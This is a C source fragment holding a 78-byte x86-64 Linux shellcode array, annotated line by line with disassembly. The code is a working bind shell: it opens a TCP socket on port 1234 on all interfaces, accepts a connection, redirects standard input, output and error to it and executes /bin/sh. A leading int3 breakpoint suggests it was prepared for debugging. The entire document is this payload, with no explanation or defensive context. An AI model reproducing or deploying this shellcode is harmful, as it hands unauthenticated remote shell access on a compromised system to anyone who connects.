
#define BS_SIZE 78

char BS[] = {
  /* 0000 */ "\xcc"                                     /* int3                        */
  /* 0001 */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0003 */ "\x58"                                     /* pop rax                     */
  /* 0004 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0006 */ "\x5e"                                     /* pop rsi                     */
  /* 0007 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0009 */ "\x5f"                                     /* pop rdi                     */
  /* 000A */ "\x99"                                     /* cdq                         */
  /* 000B */ "\x0f\x05"                                 /* syscall                     */
  /* 000D */ "\x97"                                     /* xchg edi, eax               */
  /* 000E */ "\x48\xb8\xfd\xff\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfffd */
  /* 0018 */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 001B */ "\x50"                                     /* push rax                    */
  /* 001C */ "\x54"                                     /* push rsp                    */
  /* 001D */ "\x5e"                                     /* pop rsi                     */
  /* 001E */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0020 */ "\xb0\x31"                                 /* mov al, 0x31                */
  /* 0022 */ "\x0f\x05"                                 /* syscall                     */
  /* 0024 */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 0026 */ "\xb0\x32"                                 /* mov al, 0x32                */
  /* 0028 */ "\x0f\x05"                                 /* syscall                     */
  /* 002A */ "\xb0\x2b"                                 /* mov al, 0x2b                */
  /* 002C */ "\x0f\x05"                                 /* syscall                     */
  /* 002E */ "\x97"                                     /* xchg edi, eax               */
  /* 002F */ "\x96"                                     /* xchg esi, eax               */
  /* 0030 */ "\xb0\x21"                                 /* mov al, 0x21                */
  /* 0032 */ "\x0f\x05"                                 /* syscall                     */
  /* 0034 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
  /* 0037 */ "\x79\xf7"                                 /* jns 0x30                    */
  /* 0039 */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 003B */ "\x52"                                     /* push rdx                    */
  /* 003C */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 0046 */ "\x51"                                     /* push rcx                    */
  /* 0047 */ "\x54"                                     /* push rsp                    */
  /* 0048 */ "\x5f"                                     /* pop rdi                     */
  /* 0049 */ "\x99"                                     /* cdq                         */
  /* 004A */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 004C */ "\x0f\x05"                                 /* syscall                     */
};